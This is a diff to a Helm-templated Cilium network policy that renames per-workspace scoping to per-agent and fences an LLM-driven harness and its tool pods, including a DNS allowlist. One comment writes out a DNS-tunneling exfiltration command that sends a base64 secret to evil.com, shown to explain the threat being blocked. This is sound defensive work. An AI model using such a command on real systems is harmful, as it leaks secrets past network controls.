@@ -1,4 +1,4 @@
-# Per-workspace harness egress envelope. The harness is semi-adversarial
+# Per-agent harness egress envelope. The harness is semi-adversarial
 # (it interprets LLM-driven streams); it reads its instructions in-process
 # from a mounted read-only volume. It creates credentialed tool Jobs
 # via the kube API and dispatches them in-process. This is the SOLE
@@ -6,16 +6,16 @@
 # (kube-dns, kube-apiserver, relay-controller) AND the L7 DNS
 # allowlist on kube-dns. Default-deny otherwise.
 #
-# One CNP per workspace: the harness pod carries `sycophant.md/workspace`,
-# so egress to THIS workspace's tool pods can be scoped by workspace. Cilium
-# has no "peer label equals my label" primitive, so the per-workspace scope
+# One CNP per agent: the harness pod carries `sycophant.md/agent`,
+# so egress to THIS agent's tool pods can be scoped by agent. Cilium
+# has no "peer label equals my label" primitive, so the per-agent scope
 # must be rendered, not expressed in a single namespace-wide policy.
 #
 # The harness serves one inbound surface: the relay-forward surface
 # (HarnessControl) on 9091, admitting relay-controller alone. It serves no
 # pod-facing surface — it dials each tool pod on 9090 instead, and the
-# reverse direction is denied. The sibling per-workspace CNP below admits
-# only this workspace's harness to the tool pods' gRPC port.
+# reverse direction is denied. The sibling per-agent CNP below admits
+# only this agent's harness to the tool pods' gRPC port.
 #
 # Why a single CNP and not a K8s NetworkPolicy alongside: Cilium's
 # documented "L4 shadows L7" merge semantics
@@ -26,9 +26,9 @@
 # Cilium 1.19.3.
 #
 # The L7 allowlist closes the DNS-tunneling exfil vector: without it, a
-# workspace can `dig <base64-secret>.evil.com @kube-dns` and leak data
+# agent can `dig <base64-secret>.evil.com @kube-dns` and leak data
 # through the resolver chain even with no external IP egress reachable.
-# Only relay-controller, this workspace's tool pods, and the tenant's warm
+# Only relay-controller, this agent's tool pods, and the tenant's warm
 # model Services are forwarded; all other DNS queries drop at the Cilium L7
 # proxy before reaching kube-dns.
 {{- $endpoint := .Values.harness.instructions.endpoint }}
@@ -42,30 +42,30 @@
 apiVersion: cilium.io/v2
 kind: CiliumNetworkPolicy
 metadata:
-  name: ws-{{ $name }}-egress
+  name: ag-{{ $name }}-egress
   namespace: {{ $.Release.Namespace }}
   labels:
     {{- include "sycophant.labels" $ | nindent 4 }}
-    sycophant.md/workspace: {{ $name }}
+    sycophant.md/agent: {{ $name }}
 spec:
   endpointSelector:
     matchLabels:
       app.kubernetes.io/component: harness
       app.kubernetes.io/part-of: sycophant
-      sycophant.md/workspace: {{ $name }}
+      sycophant.md/agent: {{ $name }}
   egress:
     {{- include "sycophant.dnsEgress" . | nindent 4 }}
           rules:
             dns:
               - matchName: "relay-controller.{{ $.Release.Namespace }}.svc.cluster.local"
-              # Per-call tool pods, keyed by call_id under this workspace's Service.
-              - matchPattern: "*.ws-{{ $name }}-capability.{{ $.Release.Namespace }}.svc.cluster.local"
+              # Per-call tool pods, keyed by call_id under this agent's Service.
+              - matchPattern: "*.ag-{{ $name }}-capability.{{ $.Release.Namespace }}.svc.cluster.local"
               # Warm model Services the harness dials directly for a local call.
               # Each model is its own release, so the pattern covers every
               # `inf-<key>` Service in this namespace.
               - matchPattern: "inf-*.{{ $.Release.Namespace }}.svc.cluster.local"
               # Object-storage endpoint the instructions-sync init container resolves to
-              # pull this workspace's instruction prefix. Parameterized by the
+              # pull this agent's instruction prefix. Parameterized by the
               # endpoint value so the chart stays object-storage-generic.
               {{- if $endpointHost }}
               - matchName: {{ $endpointHost | quote }}
@@ -91,7 +91,7 @@ spec:
         - ports:
             - port: "9090"
               protocol: TCP
-    # The harness dials each of THIS workspace's tool pods on the pod gRPC
+    # The harness dials each of THIS agent's tool pods on the pod gRPC
     # port to hand it its assignment, read its frames, and cancel it. The
     # reverse direction (a tool pod dialing the harness) has no rule and is
     # denied: a popped tool pod can open no socket to the harness.
@@ -99,7 +99,7 @@ spec:
         - matchLabels:
             app.kubernetes.io/component: capability-job
             app.kubernetes.io/part-of: sycophant
-            sycophant.md/workspace: {{ $name }}
+            sycophant.md/agent: {{ $name }}
       toPorts:
         - ports:
             - port: "9090"
@@ -108,15 +108,15 @@ spec:
     # directly, with no per-call job in the path. The warm pod's own fence
     # (inference-cnp.yaml) is the sole control on which port and which two chat
     # routes it accepts; this rule only grants the harness reachability to that
-    # same-tenant peer. Warm pods carry no workspace label (one Deployment per
+    # same-tenant peer. Warm pods carry no agent label (one Deployment per
     # local model provision command, tenant-wide), so this peer is not
-    # workspace-scoped.
+    # agent-scoped.
     - toEndpoints:
         - matchLabels:
             app.kubernetes.io/component: inference
             app.kubernetes.io/part-of: sycophant
     # The instructions-sync init container reaches the shared object store (a core
-    # cluster component in the system namespace) to pull this workspace's
+    # cluster component in the system namespace) to pull this agent's
     # instruction prefix. The DNS L7 allowlist above admits the host for
     # resolution; this L4 rule admits the peer itself, cross-namespace. It
     # selects the store by component label plus its namespace, not toFQDNs: the
@@ -141,8 +141,8 @@ spec:
     {{- end }}
   ingress:
     # Relay forwards registered-user requests to this harness's relay-forward
-    # surface (HarnessControl) on 9091. relay-controller serves every workspace and
-    # routes by verified workspace, so this rule is not workspace-scoped.
+    # surface (HarnessControl) on 9091. relay-controller serves every agent and
+    # routes by verified agent, so this rule is not agent-scoped.
     - fromEndpoints:
         - matchLabels:
             app.kubernetes.io/name: relay-controller
@@ -152,31 +152,31 @@ spec:
             - port: "9091"
               protocol: TCP
 ---
-# Per-workspace tool-pod ingress: admit ONLY this workspace's harness to the
+# Per-agent tool-pod ingress: admit ONLY this agent's harness to the
 # capability-job pods' gRPC server port. The harness dials the pod; the pod
-# never dials the harness. Rendered per workspace because Cilium cannot express
-# "peer workspace equals my workspace" in one namespace-wide policy, and the
+# never dials the harness. Rendered per agent because Cilium cannot express
+# "peer agent equals my agent" in one namespace-wide policy, and the
 # namespace-wide capability-job baseline is egress-only.
 apiVersion: cilium.io/v2
 kind: CiliumNetworkPolicy
 metadata:
-  name: ws-{{ $name }}-job-ingress
+  name: ag-{{ $name }}-job-ingress
   namespace: {{ $.Release.Namespace }}
   labels:
     {{- include "sycophant.labels" $ | nindent 4 }}
-    sycophant.md/workspace: {{ $name }}
+    sycophant.md/agent: {{ $name }}
 spec:
   endpointSelector:
     matchLabels:
       app.kubernetes.io/component: capability-job
       app.kubernetes.io/part-of: sycophant
-      sycophant.md/workspace: {{ $name }}
+      sycophant.md/agent: {{ $name }}
   ingress:
     - fromEndpoints:
         - matchLabels:
             app.kubernetes.io/component: harness
             app.kubernetes.io/part-of: sycophant
-            sycophant.md/workspace: {{ $name }}
+            sycophant.md/agent: {{ $name }}
       toPorts:
         - ports:
             - port: "9090"
